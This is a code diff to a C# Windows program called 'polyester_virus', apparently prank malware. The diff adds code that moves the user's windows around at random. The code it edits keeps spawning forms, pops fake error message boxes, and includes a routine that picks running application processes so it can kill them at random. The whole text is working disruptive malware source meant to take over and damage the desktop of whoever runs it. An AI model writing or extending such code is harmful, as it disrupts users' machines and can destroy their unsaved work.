@@ -1,4 +1,5 @@
 using LibVLCSharp.Shared;
+using polyester_virus.Windows;
 using System.Diagnostics;
 using System.Media;
 using System.Runtime.InteropServices;
@@ -10,7 +11,7 @@ namespace polyester_virus
         [DllImport("kernel32.dll")]
         private static extern bool AllocConsole();
 
-        public static LibVLC libVLC { get; private set; }
+        public static LibVLC libVLC { get; private set; } = new();
 
         /// <summary>
         ///  The main entry point for the application.
@@ -22,7 +23,6 @@ namespace polyester_virus
             // see https://aka.ms/applicationconfiguration.
             ApplicationConfiguration.Initialize();
             LibVLCSharp.Shared.Core.Initialize();
-            libVLC = new LibVLC();
 
             Form1 form1 = new();
             Application.Run(form1);
@@ -38,12 +38,18 @@ namespace polyester_virus
             Form2.Create();
             timer.Tick += (_, _) =>
             {
+                WindowMover.MoveWindowsRandomly();
+
                 Form2.Create();
                 if (Random.Shared.Next(3) == 1)
                 {
                     CoolMessageBox.ShowNonBlocking("polyester boi (spider pih)", "ERROR", 
                         MessageBoxButtons.OK, MessageBoxIcon.Error, 
                         true, true);
+                }
+                if (Random.Shared.Next(3) == 1)
+                {
+                    WindowMover.MoveWindowsRandomly();
                 }
                 if (Random.Shared.Next(4) == 1)
                 {
@@ -84,7 +90,7 @@ namespace polyester_virus
 
         static bool KillRandomWindowProcess()
         {
-            var processes = Process.GetProcesses()
+            IOrderedEnumerable<Process> processes = Process.GetProcesses()
                 .Where(p =>
                 {
                     try
